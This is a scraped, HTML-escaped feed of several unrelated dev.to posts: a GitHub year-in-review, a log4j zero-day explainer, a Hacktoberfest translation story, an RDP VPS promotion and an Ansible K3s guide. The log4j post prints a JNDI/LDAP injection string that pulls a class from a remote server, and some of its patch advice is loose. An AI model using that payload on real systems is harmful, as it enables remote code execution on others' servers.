&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--4ccT_RLF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/88w9pk3emo48rxex8nbb.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--4ccT_RLF--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/88w9pk3emo48rxex8nbb.gif" alt="2021 GitHub Skyline!" width="880" height="445"&gt;&lt;/a&gt; &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#get-your-contribution-graph-printed"&gt;
  &lt;/a&gt;
  Get your contribution graph printed
&lt;/h2&gt;

&lt;p&gt;Speaking of contributions, there are lots of ways you can celebrate your 2021 achievements. Get your contributions printed on a &lt;a href="https://gitmerch.com/"&gt;tshirt, hoodie, tote, or mug with GitMerch&lt;/a&gt; or on a &lt;a href="https://commitprint.com/"&gt;poster with Commit Print&lt;/a&gt;. These are great ideas for Christmas gifts or if you're looking for something to spice up your home office for 2022.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--ut2xcPUV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wdz358suzygoyqxlj2fh.JPG" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--ut2xcPUV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wdz358suzygoyqxlj2fh.JPG" alt="Git Hoodie" width="880" height="637"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#github-wrapped"&gt;
  &lt;/a&gt;
  GitHub wrapped
&lt;/h2&gt;

&lt;p&gt;What better way to celebrate all your achievements with a video you can share on socials. Head to &lt;a href="https://www.githubwrapped.com/"&gt;GitHub Wrapped&lt;/a&gt; and enter your username. You'll immediately get a cool video - complete with music - showing some of your top stats for 2021 to date. Don't forget to share it on socials with #GitHubWrapped.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--VNmoKdPB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/q3iplt8m45abgztlcrxk.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--VNmoKdPB--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/q3iplt8m45abgztlcrxk.gif" alt="MishManners GitHub Stats" width="880" height="601"&gt;&lt;/a&gt; &lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#christmas-time"&gt;
  &lt;/a&gt;
  Christmas time

      <description>&lt;p&gt;On December 9th, a zero-day vulnerability in log4j, a widely used Java logging library, was discovered, allowing for remote code execution by sending a specific type of string to the logger.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--DB_olvL7--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639227462485-image-resized.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--DB_olvL7--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639227462485-image-resized.png" alt="CVE report" width="760" height="386"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--SORS8jJG--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639279556820-image-resized.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--SORS8jJG--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639279556820-image-resized.png" alt="CVE" width="760" height="224"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let’s clarify how bigger and widespread this flaw is and how simple it is to attack. For starters, log4j is simply a java library, and java is a widely-used programming language, particularly at the corporate level.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--e1B5-H7x--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639236807274-image.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--e1B5-H7x--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639236807274-image.png" alt="Java Installation" width="506" height="378"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;We may have seen the message whenever we had to install or update java, that more than 3 billion devices run java, ranging from computers, phones, ATM machines, and routers, implying that there are millions, if not billions, of devices out there running this logging software, which is blended into all kinds of frequently used services like Spotify, Steam, and Apple iCloud. It's possible that devices running those are at critical risk.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--nXDIXmLe--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639236567172-image.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--nXDIXmLe--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639236567172-image.png" alt="Tech corpo" width="766" height="177"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Leave everything aside, servers that run streaming services, Boeing, Cloudflare, and Amazon, which together form a major backbone of the internet, could all be exposed to this zero-day that enables remote code execution. RCE is a very huge matter, and it usually doesn't take much more for someone to gain complete control over the server that is currently running that software. Anything that uses the apache struts or elk stack, as well as some simple standalone Java applications, could be in jeopardy. In fact, it was in one of the most popular Java applications, Minecraft, that the flaw was originally found.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Eaj3LrxV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639230360056-image.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--Eaj3LrxV--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639230360056-image.png" alt="Minecraft" width="600" height="600"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;For a few days, it was thought to be a Minecraft bug, but it quickly spread to the cybersecurity world, causing havoc. All you have to do to exploit this in Minecraft is pass the string shown below directly to the console or even the chat, which then gets passed to the logger, allowing remote code execution (RCE).&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--vn7VIMBt--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639231026950-image.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--vn7VIMBt--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639231026950-image.png" alt="Script" width="625" height="344"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--MA0wl8Av--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639231052961-image.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--MA0wl8Av--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639231052961-image.png" alt="Scripts" width="545" height="186"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Still not sure who came up with the concept to create a logger that resolves LDAP addresses or evaluates and then attempts to execute arbitrary text, but it exists, and it's a log4j feature. Unfortunately, not all log4j versions support this by the way.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;LDAP (Lightweight Directory Access Protocol) is a software protocol that allows anybody to find and locate information about companies, individuals, and other resources in a network, such as files and devices, whether on the public Internet or within a company's Intranet.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Fortunately, not all versions by default load remote code execution via LDAP, although they are still vulnerable to slightly more complicated forms of remote code execution.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--mzpRQ1Wm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639231381234-image-resized.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--mzpRQ1Wm--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639231381234-image-resized.png" alt="Statement" width="760" height="511"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;This exploit requires no skill at all to execute for those who use LDAP. There was virtually no expertise required; anyone, including youngsters, could easily hack into it.&lt;/p&gt;

&lt;p&gt;So, anywhere there is a java app or an internet service running this logger on its backend, a user can type &lt;code&gt;${jndi:ldap/servername.com/a.class}&lt;/code&gt; and boom!!  you are in. This could be a potential attack vector for this flaw. This is a very serious issue, similar to a shell shock vulnerability. There are numerous amounts of testing and execution going on right now on the internet to find services that are using this and exploiting them, and people are gathering all over the world to try and fix this before a hacker finds a way to take over every critical system or leak all of the secrets of everything, and this is also something that a lot of standard security systems that corporations and enterprises might be using. It is not even something that will be necessarily stopped because of the way that this vulnerability occurred; it is exploiting a logging functionality that is for one such a widespread feature in the very deep level of very corporations/organizations, especially using the detailed logging functionality that log4j provides, and when data is coming to the server to be logged, there are usually not a lot of security checks that occur at the point where you will just be logging whatever is going on currently and probably you don’t even think about the logging details of an event being written to your very own logging system.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--OkeR7kip--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639279874642-image-resized.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--OkeR7kip--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639279874642-image-resized.png" alt="Script" width="760" height="91"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let's look at a previous attack, such as the struts 2 vulnerability that was discovered in 2017, and the really scary part about it is that it took 2 whole days after the discovery of the bug to create an exploit  for it . Big companies that hadn't patched their services within that time frame were starting to get hacked. One of the biggest consequences of that vulnerability was a massive Equifax data breach, which exposed the personal information of about 150 million people, and the damage inflicted by this vulnerability was really very enormous.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--7m79uVss--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639232779043-image.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--7m79uVss--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639232779043-image.png" alt="Equifax" width="743" height="674"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;So, if the timeline of this log4j is similar to that of struts 2 or if it takes even 3 - 4 days to fix it, we could go from youngsters hacking each other's Minecraft servers to big companies getting hacked and having critical information, personal information of those companies or their customer’s data getting leaked onto the internet. If the timing is comparable to that of struts 2, this means that a large number of incident response professionals will be working over the clock to try to safeguard their servers and services against these flaws/vulnerabilities.&lt;/p&gt;

&lt;p&gt;When you consider that it is vacation month, many people are already on vacation, and that the world is currently experiencing a shortage of workers, many of these places may already be short-staffed, the timeline for properly patching a vulnerability like this happening right now could take a little bit longer than in the past when it took certain days to go from the discovery of this kind of vulnerability to companies being hacked/attacked so every single second counts.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;It is guaranteed that there will be large data breaches and some fascinating leaks, as we have seen in the past.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2&gt;
  &lt;a href="#remedy-conclusion"&gt;
  &lt;/a&gt;
  Remedy: Conclusion
&lt;/h2&gt;

&lt;p&gt;So there are some mitigation procedures that can be implemented right now to decrease or even eliminate the attack vector or at the very least a very simple script kitty potential that everyone will implement on their every service out there.&lt;/p&gt;

&lt;p&gt;The very first priority should be to ensure that the Java library is currently up to date. If you are using something newer than Java 8, it is currently believed that you are fairly safe, but if you are using java 8 or something older than that, you are really taking a gamble with the protection of your system. However, because this is a very new and recently discovered exploit, you may need to update to something relatively new than Java 8, but it is best to just update to the newest version of java if you can.&lt;/p&gt;

&lt;p&gt;Also, make sure you're not running the vulnerable version of log4j, because it appears that Apache just issued a new version of log4j recently which was patched.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--5aS-yNrN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639236074482-image-resized.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5aS-yNrN--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://aviyel.com/assets/uploads/files/1639236074482-image-resized.png" alt="log4j2" width="760" height="389"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Another option is to utilize or experiment with alternative logging libraries other than log4j.&lt;/p&gt;

      <title>Small contributions may have more importance than you realize</title>
      <author>MizuhoOkimoto</author>
      <pubDate>Wed, 15 Dec 2021 04:45:35 +0000</pubDate>
      <link>https://dev.to/okimotomizuho/small-contributions-may-have-more-importance-than-you-realize-526e</link>
      <guid>https://dev.to/okimotomizuho/small-contributions-may-have-more-importance-than-you-realize-526e</guid>
      <description>&lt;p&gt;Small contributions are still meaningful on your road to becoming a good programmer (I believe!). I couldn't make my 4th Pull Request during the Hacktoberfest but I didn't want to give up, and also I was frustrated by not making it.&lt;br&gt;
I tried to find an issue with medium difficulty, but it was very hard for me. When I was searching issues, I found a repo about Japanese translation.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#issue"&gt;
  &lt;/a&gt;
  Issue
&lt;/h2&gt;

&lt;p&gt;The project is a Google Chrome extension to create guidelines on websites. I don't use any extensions, so I thought it was interesting to contribute to something new to me, and a good opportunity to see the project files to create an extension.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-i-did"&gt;
  &lt;/a&gt;
  What I did
&lt;/h2&gt;

&lt;p&gt;I added &lt;code&gt;ja&lt;/code&gt; file under &lt;code&gt;_locales&lt;/code&gt; folder and Japanese translations for all strings that are indexed by &lt;code&gt;"message"&lt;/code&gt;.&lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--D3_tCS39--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1mcgs5wr1yuqbcejnom9.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--D3_tCS39--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1mcgs5wr1yuqbcejnom9.png" alt="code image" width="880" height="437"&gt;&lt;/a&gt;&lt;br&gt;
I tried to think from users' stand point and used proper Japanese. As you might think, it was kind of easy, but translating &lt;code&gt;Donation link&lt;/code&gt; was tricky. In Japanese culture, "donation" or "tip" are not very common, and if we give donation/tip, we wrap money in a certain way and use an envelope to someone who provides good service.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#what-i-learned"&gt;
  &lt;/a&gt;
  What I learned
&lt;/h2&gt;

&lt;p&gt;As I mentioned it was pretty easy, so I wanted to learn something with this contribution. Therefore, I decided to search about how to build a Google Chrome extension.&lt;br&gt;
Firstly, I checked the &lt;a href="https://developer.chrome.com/docs/extensions/mv3/overview/"&gt;official site&lt;/a&gt;. It says "extensions are software programs, built on web technologies (such as HTML, CSS, and JavaScript) that enable users to customize the Chrome browsing experience". It requires &lt;code&gt;manifest.json&lt;/code&gt;, and the file needs to be specified background scripts, content scripts, an options page, UI elements and various logic files like this project did. &lt;br&gt;
&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--5VaswGSx--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/p4c9y5jcsiz1wasw1fxy.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--5VaswGSx--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/p4c9y5jcsiz1wasw1fxy.png" alt="Imanigest.json" width="741" height="803"&gt;&lt;/a&gt;&lt;br&gt;
Inside the &lt;strong&gt;background script&lt;/strong&gt;, it has to be declared &lt;code&gt;onInstalled&lt;/code&gt; listener and it calls when the user clicks on the browser action.&lt;br&gt;
&lt;strong&gt;Content scripts&lt;/strong&gt; are files that run in the context of web pages. You can use the standard Document Object Model (DOM) to read the details of web pages accessed by browsers, make changes, and pass information to parent extensions.(The project used it calls &lt;code&gt;inject.js&lt;/code&gt;)&lt;br&gt;
&lt;strong&gt;Browser actions&lt;/strong&gt; are buttons on the toolbar of the browser.&lt;br&gt;
If you specify a popup, the popup is displayed and the content is loaded when the user clicks the icon.&lt;br&gt;
Extensions can include various forms of &lt;strong&gt;user interfaces(UI)&lt;/strong&gt;. UI uses a popup, so create a file named &lt;code&gt;popup.html&lt;/code&gt; and add it to the extension's directory.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;I made this contribution as a part of my assignment and to make up for the missed Hacktoberfest. I filed an issue and asked to be assigned to it, but I was only able to make a pull request for this project.&lt;br&gt;
It didn't use technical knowledge as a programmer, but it did achieve its goal in terms of contributing to an open source project and learning something new from it.&lt;/p&gt;

      <title>10 reasons you MUST have a RDP VPS</title>
      <author>New Linux Helper</author>
      <pubDate>Wed, 15 Dec 2021 04:08:29 +0000</pubDate>
      <link>https://dev.to/developerbishwas/10-reasons-you-must-have-a-rdp-vps-1ab7</link>
      <guid>https://dev.to/developerbishwas/10-reasons-you-must-have-a-rdp-vps-1ab7</guid>
      <description>&lt;p&gt;RDP VPS is a service that allows you to connect from a remote place to your Windows VPS system and take full control of that virtual machine.&lt;/p&gt;

&lt;p&gt;VPS is a server on its own while having a dedicated IP and administrator access. But Remote Desktop Protocol (RDP) is a Microsoft protocol designed to facilitate application, data transfer, security and encryption between client users, devices and a virtual network server.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;In a simple language&lt;/strong&gt;, it allows you to access a virtual private server with GUI from any corner of the world.&lt;/p&gt;

&lt;p&gt;The RDP technology now enables global businesses across the world to access shared applications easily and securely without necessarily hiring the service of an IT specialist. &lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--777hGvOb--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ndp5lf49i1ml4rfnswhx.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--777hGvOb--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ndp5lf49i1ml4rfnswhx.png" alt="Remote Desktop VPS" width="880" height="550"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#why-use-remote-desktop-protocol-vps"&gt;
  &lt;/a&gt;
  Why use Remote Desktop Protocol VPS?
&lt;/h2&gt;

&lt;p&gt;The major advantages of Remote Desktop Service are&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#secure-connection"&gt;
  &lt;/a&gt;
  Secure Connection
&lt;/h3&gt;

&lt;p&gt;RDP allows for safe and secure access to files and documents. &lt;/p&gt;

&lt;p&gt;All connections to your remote desktop are encrypted which ensures that your data are safe and secure. &lt;/p&gt;

&lt;p&gt;Therefore, there is no fear of losing any data through physical or cyber theft.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#freedom-to-work-from-anywhere"&gt;
  &lt;/a&gt;
  Freedom to Work from Anywhere:
&lt;/h3&gt;

&lt;p&gt;The RDP gives you the freedom to work from almost everywhere in as much as you have a computer with an internet connection. You can work from anywhere and at any time.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#cost-effective"&gt;
  &lt;/a&gt;
  Cost Effective
&lt;/h3&gt;

&lt;p&gt;With RDP, you no longer need to purchase licenses for multiple computers. &lt;/p&gt;

&lt;p&gt;All connected computers and remotely access and make use of single software on the host computer.&lt;br&gt;
Of course, everything comes with its own downside.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#my-personal-fav-vps-provider"&gt;
  &lt;/a&gt;
  My personal fav VPS provider
&lt;/h2&gt;

&lt;p&gt;I have been using &lt;a href="https://www.veeble.org/vps/windows?r=1992"&gt;Veeble&lt;/a&gt; for long time and it's quite good. The customer care service, the dashboard and the panel are good. And mainly, the VPS they provide are smooth in performance, and extremely cost effective. &lt;/p&gt;

      <guid>https://dev.to/sahan/automating-raspberry-pi-k3s-provisioning-with-ansible-4dgg</guid>
      <description>&lt;p&gt;In this article, we will be looking at how we can automate most of the steps involved in installing a Raspberry Pi+K3s cluster by using Ansible.&lt;/p&gt;

&lt;p&gt;I explained how to set up a Kubernetes cluster on a Raspberry Pi in my previous article. In case you missed it, you can find it from the following link:&lt;/p&gt;

&lt;p&gt;🔗 &lt;strong&gt;&lt;a href="https://sahansera.dev/building-your-own-private-kubernetes-cluster-on-a-raspberry-pi-4-with-k3s/"&gt;Building your own private Kubernetes cluster on a Raspberry PI 4 with K3S&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;If you have a fresh bunch of Raspberry Pis, you might want to follow Step 0 through to Step 8 in the above. However, it’s a one-off setup, so please proceed to the following sections if you already have done them.&lt;/p&gt;

&lt;p&gt;In a nutshell, this is what we are trying to automate.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--mZEG1qxo--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://sahansera.dev/static/d39f0323d272251c6acceddf6c3761df/5a190/k3s-rapsberrypi-ansible-automation-0.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--mZEG1qxo--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://sahansera.dev/static/d39f0323d272251c6acceddf6c3761df/5a190/k3s-rapsberrypi-ansible-automation-0.png" alt="k3s-rapsberrypi-ansible-automation-0.png" title="k3s-rapsberrypi-ansible-automation-0.png" width="800" height="584"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-1-installing-ansible"&gt;
  &lt;/a&gt;
  Step 1 - Installing Ansible
&lt;/h3&gt;

&lt;p&gt;So what do we need to get started? You need one or more RPis with Raspbian installed (or an OS &lt;a href="https://rancher.com/docs/k3s/latest/en/installation/installation-requirements/#operating-systems"&gt;supported by K3s&lt;/a&gt;). We can get to our desired state by using an Ansible playbook.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://www.ansible.com/"&gt;Ansible&lt;/a&gt; is an industry-leading IT automation tool to provision and manage your infrastructure in a declarative form such YAML.&lt;/p&gt;

&lt;p&gt;The easiest way to get the steps to installing Ansible would be to head over to the &lt;a href="https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html"&gt;official docs&lt;/a&gt;. For most OSs, it can be just installed via &lt;code&gt;pip&lt;/code&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;python &lt;span class="nt"&gt;-m&lt;/span&gt; pip &lt;span class="nb"&gt;install&lt;/span&gt; &lt;span class="nt"&gt;--user&lt;/span&gt; ansible
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;blockquote&gt;
&lt;p&gt;💡 Note: Use the latest version of Python installed on your machine. In my case, I have it set to &lt;code&gt;python3&lt;/code&gt; since Mac OS comes with an older version of Python installed.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Depending on your system and the internet connection, it will a bit of take time to install Ansible. Sometimes even if you installed it, it would still say that it can’t find &lt;code&gt;ansible&lt;/code&gt; command. If that’s the case, feel free to follow this &lt;a href="https://stackoverflow.com/questions/63177609/zsh-command-not-found-ansible-after-pip-installing"&gt;link&lt;/a&gt;. If you are on a Mac, you could also run a &lt;code&gt;brew install ansible&lt;/code&gt; to install ansible.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--HFjMLbb---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://sahansera.dev/static/70581b905961f6da018dc7d0db07d5c3/5a190/k3s-rapsberrypi-ansible-automation-1.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--HFjMLbb---/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://sahansera.dev/static/70581b905961f6da018dc7d0db07d5c3/5a190/k3s-rapsberrypi-ansible-automation-1.png" alt="k3s-rapsberrypi-ansible-automation-1.png" title="k3s-rapsberrypi-ansible-automation-1.png" width="800" height="305"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-2-k3s-ansible-playbook"&gt;
  &lt;/a&gt;
  Step 2 - K3s Ansible Playbook
&lt;/h3&gt;

&lt;p&gt;Without writing everything from the ground up, we will be using the &lt;a href="https://github.com/k3s-io/k3s-ansible"&gt;k3s-ansible&lt;/a&gt; repo.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;git clone git@github.com:k3s-io/k3s-ansible.git
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Once you have cloned the repo, you can run the following command to create a new playbook for your RPi cluster provisioning. Make sure to replace &lt;code&gt;my-cluster&lt;/code&gt; with the desired name for your cluster. In my case, I called it &lt;code&gt;rpi-cluster&lt;/code&gt;&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;&lt;span class="nb"&gt;cp&lt;/span&gt; &lt;span class="nt"&gt;-R&lt;/span&gt; inventory/sample inventory/my-cluster
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Next, we need to map out the nodes and master them in the &lt;code&gt;inventory/my-cluster/hosts.ini&lt;/code&gt; file. Update the &lt;code&gt;[master]&lt;/code&gt; and &lt;code&gt;[node]&lt;/code&gt; attributes accordingly.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;[master]
10.0.0.100

[node]
10.0.0.101

[k3s_cluster:children]
master
node
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Under &lt;code&gt;[node]&lt;/code&gt; attribute you could even specify a range of IPs if they are consecutive like so.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;[node]
10.0.0.[101:105]
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Check the &lt;code&gt;inventory/my-cluster/group_vars/all.yml&lt;/code&gt; to set variables such as &lt;code&gt;k3s_version&lt;/code&gt; and &lt;code&gt;ansible_user&lt;/code&gt;, depending on your environment.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#step-3-running-the-ansible-playbook"&gt;
  &lt;/a&gt;
  Step 3 - Running the Ansible Playbook
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight shell"&gt;&lt;code&gt;ansible-playbook site.yml &lt;span class="nt"&gt;-i&lt;/span&gt; inventory/rpi-cluster/hosts.ini &lt;span class="nt"&gt;--ask-pass&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



